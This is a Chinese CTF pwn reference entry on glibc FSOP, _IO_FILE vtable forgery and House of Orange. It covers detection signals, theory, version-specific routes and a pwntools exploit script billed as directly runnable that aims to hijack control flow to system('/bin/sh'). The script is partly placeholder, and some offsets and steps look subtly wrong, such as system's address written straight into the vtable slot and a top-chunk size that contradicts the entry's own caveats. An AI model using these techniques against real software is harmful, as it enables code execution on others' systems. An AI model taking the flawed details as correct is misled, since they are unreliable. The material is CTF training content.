---
title: FSOP 与 _IO_FILE 伪造 vtable（House of Orange / 2.34+）
category: pwn
tags: [FSOP, _IO_FILE, _IO_list_all, vtable, House of Orange, 劫持]
signals: [题目只有 malloc 没有 free, 需要劫持 stdout 或 exit handler, __free_hook 已不可用, Full RELRO 无 GOT 可改, 有 unsorted bin 但无法直接写 hook, glibc 2.24 或 2.35]
difficulty: hard
source: "CTF-Wiki IO_FILE / FSOP / House of Orange / HackTricks"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one, one_gadget]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题目**没有 `free` 功能**，只能 `add`/`edit`/`show`（House of Orange 的典型前提）。
- `checksec` 显示 Full RELRO，GOT 不可写；libc 又是 2.34+，`__free_hook` 已被删除。
- 程序在退出前会调用 `puts`/`printf`/`fflush`——给了 `_IO_FILE` 链表的触发点。
- 题目存在 unsorted bin 泄漏点，但没有 `__free_hook`。
- 反编译里出现 `_IO_2_1_stdout_`、`stdin`、`setvbuf` 相关调用。

## 二、原理

glibc 的 stdio 用 `_IO_FILE` 结构 + vtable 虚函数表实现：

```c
struct _IO_FILE {
  int _flags;                    // 0x00  关键位：_IO_NO_WRITES / _IO_CURRENTLY_PUTTING
  char *_IO_read_ptr;            // 0x08
  char *_IO_read_end;            // 0x10
  char *_IO_read_base;           // 0x18
  char *_IO_write_base;          // 0x20  ← 输出起始
  char *_IO_write_ptr;           // 0x28  ← 输出结束（>base 才能输出）
  char *_IO_write_end;           // 0x30
  ...
  struct _IO_FILE *_chain;       // 0x68  指向下一个 FILE
  ...
  const struct _IO_jump_t *vtable;   // 0xd8
};
```

**FSOP**：伪造一个 `_IO_FILE`，让它挂在 `_IO_list_all` 链上。程序退出时 `_IO_flush_all_lockp` 遍历链表，对每个 FILE 调用 `_IO_OVERFLOW`（vtable 的 `__overflow` 槽，offset `0x18`）。

触发路径：`exit()` → `_IO_cleanup` → `_IO_flush_all_lockp` → `_IO_OVERFLOW(fp)`。

**House of Orange**（无 free 时）：
1. 用 top chunk 溢出把 `top->size` 改小，使下一次 `malloc` 触发 `sysmalloc`，**把旧 top free 进 unsorted bin**（相当于凭空多了一次 free）。
2. 用 unsorted bin attack 把 `_IO_list_all` 覆盖成 `main_arena+0x60`（`unsorted_chunks` 位置，那里恰好能当 `_chain` 起点）。
3. 在 `main_arena+0x58`（即 fake FILE 的 `_chain` 位置）伪造 vtable 指针，让 `_IO_OVERFLOW` 指向 `system`。
4. 把 `"  sh;"` 或 `"/bin/sh"` 放在 fake FILE 的某字段里，使 `system(fp->... )` 实际参数指向它。

**2.24+ 的 vtable 校验**：

```c
#define _IO_VTABLE_CHECK() \
  if (__glibc_unlikely (vtable >= __start___libc_IO_vtables && \
                        vtable <  __stop___libc_IO_vtables)) ...
```

vtable 必须落在 `__libc_IO_vtables` 段内，因此不能随便伪造；改为：

- 把 vtable 指针改到 `_IO_str_jumps`（`_IO_str_overflow` 内部会 `malloc` + 调用 `((_IO_strfile*)fp)->_s._allocate_buffer`，其参数是 size，可控）。
- 或把 `vtable` 指向 `_IO_wfile_jumps` 等内部表，靠内部函数间接调用。

**2.35+**：`_IO_str_overflow` 的 `_allocate_buffer` 被改为内部 `malloc`，House of Orange 变体失效；改用 `_IO_wfile_jumps` + `_wide_data`，或直接打 `__exit_funcs` / 栈。

## 三、checksec 判读与利用思路

```text
RELRO: Full  Canary: found  NX: enabled  PIE: enabled
libc 2.23: 直接伪造 vtable 指向 system
libc 2.24~2.30: vtable 必须在 __libc_IO_vtables 内 → _IO_str_jumps / 改 __free_hook
libc 2.31~2.34: 先用 __free_hook；2.34 删除后回到 FSOP
libc 2.35+: 走 _IO_wfile_jumps + _wide_data，或 exit_funcs / 栈
```

选择路径：

1. **有 free 且 2.34 以下** → 别用 FSOP，直接 `__free_hook`。
2. **无 free** → House of Orange 造一次 free，再走 unsorted attack 改 `_IO_list_all`。
3. **能任意写 `_IO_2_1_stdout_` 的 `_IO_write_base/_IO_write_ptr`** → 直接泄露 libc（不需要打）。这是最实用的「FSOP 反向用法」。
4. **2.35+** → `_IO_wfile_jumps`：伪造 `_wide_data->_wide_vtable` 指向可控区，让 `_IO_wdoallocbuf` 调用它。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE else process()

def add(size, data=b""):
    p.sendlineafter(b"> ", b"1"); p.sendlineafter(b"size", str(size).encode())
    p.sendafter(b"data", data)

def edit(idx, data):
    p.sendlineafter(b"> ", b"3"); p.sendlineafter(b"idx", str(idx).encode())
    p.sendafter(b"data", data)
# 备注：不同题目的菜单提示符不同，统一改这里的 sendlineafter 字符串

# ---------- 工具：用 stdout 的 write_base/write_ptr 做任意读 ----------
def fsop_leak_libc(libc_base_leak_holder):
    """
    把 _IO_2_1_stdout_ 的 _flags 改成 0xfbad1800，
    _IO_write_base 设为想读的地址，_IO_write_ptr = base + n，
    下一次 puts/printf 就会把 [base, ptr) 打到 stdout。
    """
    libc.address = int(args.BASE or "0", 16)          # 占位
    stdout = libc.sym["_IO_2_1_stdout_"]
    fake = flat({
        0x00: p64(0xfbad1800),        # _flags: 允许写、无缓冲
        0x20: p64(libc.sym["environ"]),   # _IO_write_base -> 想读的地址（先读 environ 拿栈）
        0x28: p64(libc.sym["environ"] + 0x100),  # _IO_write_ptr
        0x88: p64(0),
    }, length=0xe0)
    # 通过题目任意写把 fake 覆盖到 stdout
    return stdout, fake

# ---------- House of Orange（2.23 ~ 2.30） ----------
PAGE = 0x1000
def house_of_orange():
    # 1) 申请一块靠近 top 的 chunk，用溢出让 top->size 变小
    add(0x60, b"A" * 0x60)
    # 假设 edit 能溢出到 top size（按题目布局）
    edit(0, b"A" * 0x60 + p64(0x21))        # top->size = 0x21，小于后续请求
    # 2) 申请 > 0x21 的块，触发 sysmalloc，旧 top 被 free 进 unsorted
    add(0x100, b"B" * 0x100)
    # 3) 此时 unsorted 中有 free 掉的 top；做 unsorted bin attack 改 _IO_list_all
    #    （攻击细节：写 unsorted_chunks(av)->bk，再切分触发写入 _IO_list_all）
    libc.address = int(args.BASE or "0", 16)
    io_list_all = libc.sym["_IO_list_all"]
    log.info(f"_IO_list_all = {hex(io_list_all)}")
    # 4) 伪造 FILE：vtable 在 2.23 可直接指向 system
    fake_file = flat({
        0x00: p64(0),
        0x20: p64(1),
        0x28: p64(2),
        0x68: b"/bin/sh\x00",             # _chain 位置放字符串，被当参数
        0xd8: p64(libc.sym["system"]),    # 2.23 可直接伪造 vtable
    }, length=0xe0)
    add(0x120, fake_file)
    return io_list_all

# ---------- 2.24+：vtable 必须指向 __libc_IO_vtables 内 ----------
def fsop_2_24(fake_file_addr):
    """把 vtable 指向 _IO_str_jumps，利用 _IO_str_overflow 的 _allocate_buffer 回调"""
    libc.address = int(args.BASE or "0", 16)
    return flat({
        0x00: p64(0), 0x20: p64(0), 0x28: p64(0x100), 0x38: p64(0x100),
        0xa0: p64(fake_file_addr + 0x100),       # _s._allocate_buffer 槽
        0xd8: p64(libc.sym["_IO_str_jumps"]),    # 合法 vtable
    }, length=0xe0)

# ---------- 2.35+：_IO_wfile_jumps 路线 ----------
def fsop_2_35(heap_ctrl):
    """_wide_data->_wide_vtable->__doallocate 被调用，指向 system"""
    libc.address = int(args.BASE or "0", 16)
    payload = flat({
        0x00: p64(0), 0x20: p64(0),
        0xa0: p64(heap_ctrl + 0x10),             # _wide_data 指向可控区
        0xd8: p64(libc.sym["_IO_wfile_jumps"]),
    }, length=0xe0)
    wide   = flat({0x18: p64(0), 0x20: p64(1), 0xe0: p64(heap_ctrl + 0x200)}, length=0x100)
    vtable = flat({0x68: p64(libc.sym["system"])}, length=0x80)
    return payload, wide, vtable

if __name__ == "__main__":
    p = start()
    house_of_orange()
    p.interactive()
```

确认 vtable 校验范围：

```bash
gdb -q ./pwn -ex 'p &__start___libc_IO_vtables' -ex 'p &__stop___libc_IO_vtables' -ex q
# 看 __libc_IO_vtables 段范围，判断伪造 vtable 是否合法
```

## 五、常见坑 / 变体

- **vtable 校验只在 glibc 2.24+**：2.23 随便伪造；2.24~2.34 必须在 `__libc_IO_vtables` 段内。
- **`_flags` 位选错**：要触发 `_IO_OVERFLOW`，需 `_flags & _IO_NO_WRITES == 0` 且 `_IO_write_ptr > _IO_write_base`。
- **`exit()` 与 `abort()` 路径不同**：`exit` 走 `_IO_cleanup`，`abort` 走 `__libc_message`，只有前者会刷所有 FILE。
- **House of Orange 的 `top->size` 校验**：2.28+ 检查 `size > system_mem`，需 `0x1 < size < 0x1000` 且 `prev_inuse` 位正确。
- **`_IO_str_jumps` 在 2.35 被改**：`_allocate_buffer` 内部改为直接 `malloc`，回调失效，改用 `_IO_wfile_jumps`。

## 六、参考来源

- [CTF-Wiki: IO_FILE 结构与利用](https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/)
- [CTF-Wiki: 伪造 vtable 劫持程序流程](https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/)
- [CTF-Wiki: FSOP](https://ctf-wiki.org/pwn/linux/user-mode/io-file/fsop/)
- [CTF-Wiki: House of Orange](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/)
- [glibc libio 源码（elixir.bootlin.com）](https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c)
- [HackTricks: Libc Heap / FSOP](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html)
- [Quarkslab: Heap exploitation, glibc internals](https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html)
